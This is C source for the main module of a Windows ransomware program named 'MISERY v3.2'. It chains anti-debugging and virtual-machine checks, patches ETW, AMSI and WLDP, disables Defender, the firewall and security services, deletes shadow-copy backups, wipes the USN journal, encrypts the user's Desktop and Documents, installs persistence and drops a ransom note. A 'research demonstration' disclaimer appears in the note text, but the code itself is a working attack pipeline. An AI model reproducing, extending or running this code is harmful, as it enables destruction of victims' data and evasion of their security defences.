#include "misery_config.h"
#include "crypto.h"
#include "fileops.h"
#include "defense.h"
#include "security.h"
#include "persistence.h"
#include "utils.h"
#include "ransomnote.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <time.h>
#include <shlobj.h>

#define KEYFILE "misery.key"
#define MAX_TARGETS 100
#define ENCRYPTION_TIMEOUT_MS 300000

/* Target directories for encryption/decryption */
/* FIX: Removed the project source directory from targets so misery.key is safe */
const char *g_target_dirs[] = {
    "C:\\Users\\jahan\\OneDrive\\Desktop",
    "C:\\Users\\jahan\\Documents",
    NULL
};

/* ═══════════════════════════════════════════════════════════════
 * Generate random 20-character alphanumeric key
 * ═══════════════════════════════════════════════════════════════ */
static void GenerateRandomKey(char *key, DWORD keySize) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                           "abcdefghijklmnopqrstuvwxyz"
                           "0123456789";
    const DWORD charsetLen = (DWORD)(sizeof(charset) - 1);

    /* Use CryptoAPI for true random bytes */
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BYTE randomBytes[32];
        if (CryptGenRandom(hProv, 20, randomBytes)) {
            for (DWORD i = 0; i < 20; i++) {
                key[i] = charset[randomBytes[i] % charsetLen];
            }
            key[20] = '\0';
            CryptReleaseContext(hProv, 0);
            return;
        }
        CryptReleaseContext(hProv, 0);
    }

    /* Fallback: use rand() seeded with tick count */
    srand(GetTickCount());
    for (DWORD i = 0; i < 20; i++) {
        key[i] = charset[rand() % charsetLen];
    }
    key[20] = '\0';
}

/* ═══════════════════════════════════════════════════════════════
 * Decryption engine — called from ransom note GUI
 * ═══════════════════════════════════════════════════════════════ */
bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats) {
    if (!key || !*key) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: No key provided");
        return false;
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Starting decryption with user-provided key");

    /* Step 1: Find the first .encrypted file to extract the salt */
    BYTE salt[SALT_SIZE] = {0};
    bool saltFound = false;

    for (int i = 0; g_target_dirs[i] && !saltFound; i++) {
        char searchPath[FILEOPS_MAX_PATH];
        snprintf(searchPath, sizeof(searchPath), "%s\\*%s", g_target_dirs[i], ENC_EXT);

        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            char encFilePath[FILEOPS_MAX_PATH];
            snprintf(encFilePath, sizeof(encFilePath), "%s\\%s", g_target_dirs[i], fd.cFileName);

            HANDLE hSalt = CreateFileA(encFilePath, GENERIC_READ, FILE_SHARE_READ,
                                       NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hSalt != INVALID_HANDLE_VALUE) {
                DWORD readBytes = 0;
                if (ReadFile(hSalt, salt, SALT_SIZE, &readBytes, NULL) && readBytes == SALT_SIZE) {
                    saltFound = true;
                    MiseryLog(MISERY_LOG_INFO, "Decrypt: Extracted salt from %s", encFilePath);
                }
                CloseHandle(hSalt);
            }
            FindClose(hFind);
        }
    }

    if (!saltFound) {
        MiseryLog(MISERY_LOG_WARN, "Decrypt: No encrypted files found in target directories");
        if (outStats) {
            outStats->filesSucceeded = 0;
            outStats->filesFailed = 0;
            outStats->bytesProcessed = 0;
        }
        return true; /* Nothing to do isn't a failure */
    }

    /* Step 2: Cleanup existing crypto and re-init with the user's key and extracted salt */
    CleanupCrypto();

    CRYPTO_ERROR cerr = InitCrypto(key, strlen(key), salt);
    if (cerr != CRYPTO_SUCCESS) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: InitCrypto failed: %s (code=%d)",
                  GetErrorString(cerr), cerr);
        return false;
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Crypto initialized with user key");

    /* Step 3: Configure and run fileops in decrypt mode */
    FILEOPS_CONFIG cfg = {0};
    cfg.threadCount = 8;
    cfg.ioBufferSize = (64 * 1024);
    cfg.flags = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx = GetCryptoCtx();
    cfg.decryptMode = true;

    FILEOPS_CTX *fctx = FileOps_CreateContext(&cfg);
    if (!fctx) {
        MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed to create FileOps context");
        return false;
    }

    for (int i = 0; g_target_dirs[i] != NULL; i++) {
        MiseryLog(MISERY_LOG_INFO, "Decrypt: Processing directory: %s", g_target_dirs[i]);
        WCHAR wide_path[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1, wide_path, FILEOPS_MAX_PATH);
        FileOps_TraverseAndQueue(fctx, wide_path);
    }

    MiseryLog(MISERY_LOG_INFO, "Decrypt: Waiting for decryption to complete...");
    FileOps_WaitForCompletion(fctx);

    if (outStats) {
        FileOps_GetStats(fctx, outStats);
    }

    FILEOPS_STATS stats;
    FileOps_GetStats(fctx, &stats);
    MiseryLog(MISERY_LOG_INFO, "Decrypt: Complete — %lld succeeded, %lld failed, %lld bytes",
              stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);

    FileOps_DestroyContext(fctx);
    return true;
}

/* ═══════════════════════════════════════════════════════════════
 * PHASE EXECUTIONS
 * ═══════════════════════════════════════════════════════════════ */

static bool ExecutePhaseAntiAnalysis(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ANTI-ANALYSIS phase...");
    bool success = true;
    if (DefenseCheckDebugger()) {
        MiseryLog(MISERY_LOG_WARN, "Debugger detected! Aborting.");
        return false;
    }
    if (DefenseDetectAnalysisTools()) {
        MiseryLog(MISERY_LOG_WARN, "Analysis tools detected!");
        success = false;
    }
    if (DefenseDetectVirtualMachine()) {
        MiseryLog(MISERY_LOG_WARN, "VM detected!");
        success = false;
    }
    return MiseryPhaseTransition(PHASE_ANTI_ANALYSIS, success);
}

static bool ExecutePhaseDefensePatching(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting DEFENSE PATCHING phase...");
    bool success = true;
    if (!DefensePatchETW())        { MiseryLog(MISERY_LOG_WARN, "ETW patch failed");  success = false; }
    if (!DefensePatchAMSI())       { MiseryLog(MISERY_LOG_WARN, "AMSI patch failed"); success = false; }
    if (!DefensePatchWLDP())       { MiseryLog(MISERY_LOG_WARN, "WLDP patch failed"); success = false; }
    DefenseHideFromDebugger();
    DefenseResetSecurityChecks();
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseSecurityDisable(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting SECURITY DISABLE phase...");
    bool success = true;
    if (!SecurityDisableDefender())      { MiseryLog(MISERY_LOG_WARN, "Defender disable failed");  success = false; }
    if (!SecurityKillSecurityServices()) { MiseryLog(MISERY_LOG_WARN, "Svc kill failed");          success = false; }
    if (!SecurityDisableFirewall())      { MiseryLog(MISERY_LOG_WARN, "Firewall disable failed");  success = false; }
    return MiseryPhaseTransition(PHASE_DEFENSE_DISABLE, success);
}

static bool ExecutePhaseBackupDestroy(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting BACKUP DESTROY phase...");
    bool success = true;
    if (!UtilsNukeBackups())     { MiseryLog(MISERY_LOG_WARN, "VSS nuke failed");  success = false; }
    if (!UtilsWipeUSNJournal())  { MiseryLog(MISERY_LOG_WARN, "USN wipe failed");  success = false; }
    return MiseryPhaseTransition(PHASE_BACKUP_DESTROY, success);
}

static bool ExecutePhaseEncryption(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting ENCRYPTION phase...");
    bool success = true;
    FILEOPS_CONFIG cfg = {0};

    CRYPTO_CTX *crypto_ctx = GetCryptoCtx();
    if (!crypto_ctx || !crypto_ctx->initialized) {
        MiseryLog(MISERY_LOG_ERROR, "Crypto context not initialized!");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    cfg.threadCount = 8;
    cfg.ioBufferSize = (64 * 1024);
    cfg.flags = FILEOPS_FLAG_RECURSIVE;
    cfg.pfnShouldSkip = FileOps_DefaultShouldSkip;
    cfg.crypto_ctx = crypto_ctx;
    cfg.decryptMode = false;

    MiseryLog(MISERY_LOG_INFO, "FileOps config: crypto_ctx=%p, threads=%lu",
              cfg.crypto_ctx, cfg.threadCount);

    FILEOPS_CTX *fileops_ctx = FileOps_CreateContext(&cfg);
    if (!fileops_ctx) {
        MiseryLog(MISERY_LOG_ERROR, "Failed to create FileOps context");
        return MiseryPhaseTransition(PHASE_ENCRYPTION, false);
    }

    for (int i = 0; g_target_dirs[i] != NULL; i++) {
        WCHAR wide_path[FILEOPS_MAX_PATH];
        MultiByteToWideChar(CP_UTF8, 0, g_target_dirs[i], -1, wide_path, FILEOPS_MAX_PATH);
        FileOps_TraverseAndQueue(fileops_ctx, wide_path);
    }

    FileOps_WaitForCompletion(fileops_ctx);

    FILEOPS_STATS stats = {0};
    FileOps_GetStats(fileops_ctx, &stats);

    MiseryLog(MISERY_LOG_INFO, "Encryption stats: %lld bytes, %lld succeeded, %lld failed",
              stats.bytesProcessed, stats.filesSucceeded, stats.filesFailed);

    g_misery_ctx.filesEncrypted = (DWORD)stats.filesSucceeded;
    g_misery_ctx.filesFailed = (DWORD)stats.filesFailed;
    g_misery_ctx.bytesEncrypted = stats.bytesProcessed;

    FileOps_DestroyContext(fileops_ctx);
    return MiseryPhaseTransition(PHASE_ENCRYPTION, success);
}

static bool ExecutePhasePeristence(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting PERSISTENCE phase...");
    bool success = PersistenceInstallAll();
    return MiseryPhaseTransition(PHASE_PERSISTENCE, success);
}

static bool ExecutePhaseRansomNote(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting RANSOM NOTE phase...");
    bool success = true;

    /* Drop text note on desktop */
    const char *note_content =
        "========================================\n"
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "========================================\n"
        "This is a research project demonstration.\n"
        "For authorized penetration tests only.\n"
        "========================================\n";

    char desktop_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) == S_OK) {
        char note_path[MAX_PATH * 2];
        snprintf(note_path, sizeof(note_path), "%s\\README.txt", desktop_path);
        if (!UtilsDropRansomNote(note_path, note_content)) success = false;
    }

    /* Show GUI window — BLOCKING */
    ShowRansomNoteWindow();

    return MiseryPhaseTransition(PHASE_RANSOM_NOTE, success);
}

static bool ExecutePhaseCleanup(void) {
    MiseryLog(MISERY_LOG_INFO, "Starting CLEANUP phase...");
    CleanupCrypto();
    return MiseryPhaseTransition(PHASE_CLEANUP, true);
}

/* ═══════════════════════════════════════════════════════════════
 * Save key file to a safe location OUTSIDE all target directories
 * ═══════════════════════════════════════════════════════════════ */
static bool SaveKeyFile(const char *key, const BYTE *salt) {
    int savedCount = 0;

    /* ── Location 1: Desktop (user-visible, expected location) ── */
    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        FILE *kf = fopen(keyPath, "wb");
        if (kf) {
            fwrite(salt, 1, SALT_SIZE, kf);
            fprintf(kf, "%s\n", key);
            fclose(kf);
            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
            savedCount++;
        } else {
            MiseryLog(MISERY_LOG_WARN, "Failed to save key to Desktop: %s (err: %d)",
                      keyPath, GetLastError());
        }
    }

    /* ── Location 2: %%TEMP%% (system temp, outside all target dirs) ── */
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", tempPath);
        FILE *kf = fopen(keyPath, "wb");
        if (kf) {
            fwrite(salt, 1, SALT_SIZE, kf);
            fprintf(kf, "%s\n", key);
            fclose(kf);
            MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
            savedCount++;
        } else {
            MiseryLog(MISERY_LOG_WARN, "Failed to save key to TEMP: %s (err: %d)",
                      keyPath, GetLastError());
        }
    }

    /* ── Location 3: CWD (project directory) — safe with new skip logic ── */
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", cwd);
        /* Avoid writing CWD key if it happens to be Desktop or TEMP (no duplicates) */
        if (_stricmp(cwd, desktop) != 0 &&
            (GetTempPathA(MAX_PATH, tempPath) && _stricmp(cwd, tempPath) != 0)) {
            FILE *kf = fopen(keyPath, "wb");
            if (kf) {
                fwrite(salt, 1, SALT_SIZE, kf);
                fprintf(kf, "%s\n", key);
                fclose(kf);
                MiseryLog(MISERY_LOG_INFO, "Key saved to: %s", keyPath);
                savedCount++;
            } else {
                MiseryLog(MISERY_LOG_WARN, "Failed to save key to CWD: %s (err: %d)",
                          keyPath, GetLastError());
            }
        }
    }

    return savedCount > 0;
}

    /* Fallback to current directory — but this will be skipped by fileops */
bool save_key_to_file(const char *key, const uint8_t *salt) {
    FILE *kf = fopen("misery.key", "wb");
    if (kf) {
        fwrite(salt, 1, SALT_SIZE, kf);
        fprintf(kf, "%s\n", key);
        fclose(kf);
        MiseryLog(MISERY_LOG_INFO, "Key saved to: misery.key (CWD)");
        return true;
    }
    return false;
}

/* ═══════════════════════════════════════════════════════════════
 * Try to open key file from any known safe location
 * ═══════════════════════════════════════════════════════════════ */
static FILE *OpenKeyFile(char *outPath, size_t outPathSize) {
    /* Try %TEMP% first */
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath)) {
        snprintf(outPath, outPathSize, "%s\\misery.key", tempPath);
        FILE *kf = fopen(outPath, "rb");
        if (kf) return kf;
    }

    /* Try desktop */
    char desktop[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        snprintf(outPath, outPathSize, "%s\\misery.key", desktop);
        FILE *kf = fopen(outPath, "rb");
        if (kf) return kf;
    }

    /* Try CWD */
    snprintf(outPath, outPathSize, "misery.key");
    FILE *kf = fopen(outPath, "rb");
    if (kf) return kf;

    return NULL;
}

/* ═══════════════════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════════════════ */
int main(int argc, char **argv) {
    DWORD start_time = GetTickCount();

    if (!MiseryInitContext()) {
        puts("[!] Failed to initialize context");
        return 1;
    }

    puts("========== MISERY v3.2 RANSOMWARE ENGINE ==========");
    MiseryLog(MISERY_LOG_INFO, "=== MISERY INITIALIZATION ===");

    /* Parse command line */
    bool decryptmode = (argc > 1 && strcmp(argv[1], "-d") == 0);

    if (decryptmode) {
        /* ── DECRYPT MODE (command line) ── */
        MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");

        char keyfilePath[MAX_PATH * 2] = {0};
        char key[256] = {0};
        BYTE salt[SALT_SIZE] = {0};

        FILE *kf = OpenKeyFile(keyfilePath, sizeof(keyfilePath));
        if (!kf) {
            MiseryLog(MISERY_LOG_ERROR, "Missing misery.key! Cannot decrypt.");
            MiseryCleanupContext();
            return 1;
        }
        if (fread(salt, 1, SALT_SIZE, kf) != SALT_SIZE) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read salt from %s", keyfilePath);
            fclose(kf);
            MiseryCleanupContext();
            return 1;
        }
        if (!fgets(key, sizeof(key), kf)) {
            MiseryLog(MISERY_LOG_ERROR, "Failed to read key from %s", keyfilePath);
            fclose(kf);
            MiseryCleanupContext();
            return 1;
        }
        key[strcspn(key, "\r\n")] = 0;
        fclose(kf);

        MiseryLog(MISERY_LOG_INFO, "Decrypt: salt and key loaded from %s", keyfilePath);

        if (InitCrypto(key, strlen(key), salt) != CRYPTO_SUCCESS) {
            MiseryLog(MISERY_LOG_ERROR, "InitCrypto failed for decrypt!");
            MiseryCleanupContext();
            return 1;
        }

        FILEOPS_STATS stats = {0};
        if (MiseryRunDecrypt(key, &stats)) {
            MiseryLog(MISERY_LOG_INFO, "Decrypt: %lld files decrypted, %lld failed",
                      stats.filesSucceeded, stats.filesFailed);
        } else {
            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed");
        }

        CleanupCrypto();
        MiseryCleanupContext();
        printf("[+] Done\n");
        return 0;
    }

    /* ── ENCRYPT MODE ── */
    MiseryLog(MISERY_LOG_INFO, "Mode: ENCRYPT");

    /* Generate random 20-character key */
    char key[256] = {0};
    GenerateRandomKey(key, sizeof(key));
    MiseryLog(MISERY_LOG_INFO, "Generated random encryption key: %s", key);

    /* Initialize crypto with random salt */
    if (InitCrypto(key, strlen(key), NULL) != CRYPTO_SUCCESS) {
        MiseryLog(MISERY_LOG_ERROR, "Failed to initialize crypto!");
        MiseryCleanupContext();
        return 1;
    }

  /* ── Save key to ALL safe locations ── */
if (!SaveKeyFile(key, GetCryptoCtx()->salt)) {
    MiseryLog(MISERY_LOG_ERROR, "CRITICAL: Failed to save key to ANY location!");
} else {
    MiseryLog(MISERY_LOG_INFO, "Key file saved successfully to at least one location.");
}
    /* Phase 1: Anti-Analysis */
    if (!ExecutePhaseAntiAnalysis()) {
        MiseryLog(MISERY_LOG_WARN, "Anti-analysis failed, continuing...");
    }

    /* Phase 2: Defense Patching */
    ExecutePhaseDefensePatching();

    /* Phase 3: Security Disable */
    ExecutePhaseSecurityDisable();

    /* Phase 4: Backup Destruction */
    ExecutePhaseBackupDestroy();

    /* Phase 5: Encryption */
    if (!ExecutePhaseEncryption()) {
        MiseryLog(MISERY_LOG_ERROR, "Encryption phase failed!");
        MiseryCleanupContext();
        return 1;
    }

    /* Phase 6: Persistence */
    ExecutePhasePeristence();

    /* Phase 7: Ransom Note (includes decrypt GUI) */
    ExecutePhaseRansomNote();

    /* Phase 8: Cleanup */
    ExecutePhaseCleanup();

    g_misery_ctx.executionTimeMs = GetTickCount() - start_time;

    MiseryLog(MISERY_LOG_INFO, "=== EXECUTION COMPLETE ===");
    MiseryReportStats();
    MiseryCleanupContext();

    MiseryLog(MISERY_LOG_INFO, "Total time: %lu ms", g_misery_ctx.executionTimeMs);
    puts("[+] Done");
    return 0;
}